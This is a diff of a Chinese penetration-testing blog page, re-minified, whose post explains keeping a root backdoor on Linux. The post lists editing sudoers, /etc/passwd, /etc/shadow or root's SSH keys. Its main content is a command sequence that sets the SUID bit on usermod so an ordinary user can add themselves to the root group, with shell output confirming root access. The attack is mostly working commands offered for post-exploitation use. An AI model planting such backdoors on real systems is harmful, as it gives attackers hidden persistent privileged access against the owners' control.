@@ -1,159 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>Linux 之 SUID 后门 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>Linux 之 SUID 后门</h1>
-      
-<div class="post-meta">
-    <time>2016-04-18</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/backdoor">backdoor</a>)
-</div>
-
-      <div><p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制</p>
-<h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限</h3>
-<ul>
-<li>写sudoers添加用户  <code>//最佳方案</code></li>
-<li>vim /etc/passwd    <code>//将uid和gid改为0</code></li>
-<li>vim /etc/shadow    <code>//密文覆盖</code></li>
-<li>vim root .ssh/证书文件   <code>.ssh这个文件夹和证书的权限要正确，要和原来一致</code></li>
-</ul>
-<h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门</h3>
-<ul>
-<li>在root权限下给usermod一个s权限</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># which usermod   #得到usermod的路径                             </span>
-</span></span><span style="display:flex;"><span>/usr/sbin/usermod
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># chmod u+s /usr/sbin/usermod</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls -l /usr/sbin/usermod</span>
-</span></span><span style="display:flex;"><span>-rwsr-x---. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">98680</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2011</span> /usr/sbin/usermod
-</span></span></code></pre></div><ul>
-<li>usermod给其他人一个x权限</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost ~<span style="color:#f92672">]</span><span style="color:#75715e"># chmod o+x /usr/sbin/usermod</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost ~<span style="color:#f92672">]</span><span style="color:#75715e"># ls -l /usr/sbin/usermod</span>
-</span></span><span style="display:flex;"><span>-rwsr-x--x. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">98680</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2011</span> /usr/sbin/usermod
-</span></span></code></pre></div><ul>
-<li>切换到普通用户wyb</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ id wyb
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ usermod -g root wyb
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ id wyb
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ exit
-</span></span></code></pre></div><ul>
-<li>验证</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>重新用wyb连接，此时即为root权限
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ cd /root  <span style="color:#75715e">#若能切换到此目录即证明确实获得了root权限</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost root<span style="color:#f92672">]</span>$ ls
-</span></span><span style="display:flex;"><span>anaconda-ks.cfg  install.log  install.log.syslog
-</span></span></code></pre></div><h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件</h3>
-<ul>
-<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>Linux 之 SUID 后门 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>Linux 之 SUID 后门</h1><div class=post-meta><time>2016-04-18</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/backdoor>backdoor</a>)</div><div><p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制</p><h3 id=0x00-为二进制文件添加s权限从而提升为root权限>0x00 为二进制文件添加s权限从而提升为root权限</h3><ul><li>写sudoers添加用户 <code>//最佳方案</code></li><li>vim /etc/passwd <code>//将uid和gid改为0</code></li><li>vim /etc/shadow <code>//密文覆盖</code></li><li>vim root .ssh/证书文件 <code>.ssh这个文件夹和证书的权限要正确，要和原来一致</code></li></ul><h3 id=0x01-suid主要作用可以是留后门>0x01 SUID主要作用可以是留后门</h3><ul><li>在root权限下给usermod一个s权限</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># which usermod   #得到usermod的路径                             </span>
+</span></span><span style=display:flex><span>/usr/sbin/usermod
+</span></span><span style=display:flex><span><span style=color:#75715e># chmod u+s /usr/sbin/usermod</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ls -l /usr/sbin/usermod</span>
+</span></span><span style=display:flex><span>-rwsr-x---. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>98680</span> Dec  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2011</span> /usr/sbin/usermod
+</span></span></code></pre></div><ul><li>usermod给其他人一个x权限</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@localhost ~<span style=color:#f92672>]</span><span style=color:#75715e># chmod o+x /usr/sbin/usermod</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@localhost ~<span style=color:#f92672>]</span><span style=color:#75715e># ls -l /usr/sbin/usermod</span>
+</span></span><span style=display:flex><span>-rwsr-x--x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>98680</span> Dec  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2011</span> /usr/sbin/usermod
+</span></span></code></pre></div><ul><li>切换到普通用户wyb</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost ~<span style=color:#f92672>]</span>$ id wyb
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>wyb<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>wyb<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>wyb<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost ~<span style=color:#f92672>]</span>$ usermod -g root wyb
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost ~<span style=color:#f92672>]</span>$ id wyb
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>wyb<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost ~<span style=color:#f92672>]</span>$ exit
+</span></span></code></pre></div><ul><li>验证</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>重新用wyb连接，此时即为root权限
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost ~<span style=color:#f92672>]</span>$ cd /root  <span style=color:#75715e>#若能切换到此目录即证明确实获得了root权限</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>wyb@localhost root<span style=color:#f92672>]</span>$ ls
+</span></span><span style=display:flex><span>anaconda-ks.cfg  install.log  install.log.syslog
+</span></span></code></pre></div><h3 id=0x02-查找拥有s权限的文件>0x02 查找拥有s权限的文件</h3><ul><li>find / -perm -u=s -type f 2>/dev/null</li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
